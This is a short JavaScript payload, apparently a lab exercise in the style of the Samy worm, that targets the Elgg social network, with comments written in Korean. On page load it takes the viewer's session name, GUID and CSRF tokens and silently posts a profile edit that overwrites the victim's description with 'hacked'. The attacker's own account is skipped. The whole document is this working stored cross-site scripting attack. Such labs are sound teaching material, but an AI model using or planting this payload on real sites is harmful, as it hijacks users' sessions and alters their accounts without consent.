<script type="text/javascript">
window.onload=function(){
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var desc = encodeURIComponent("hacked"); // FILL IN 프로필에 입력될 내용
    var content= "description=" + desc + userName + guid + ts + token; // FILL IN 리퀘스트 구성하는 매개변수 입력
    var sendurl = "/action/profile/edit"; // FILL IN
    var samygid= 49; //FILL IN
    if (elgg.session.user.guid!=samygid){
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>  
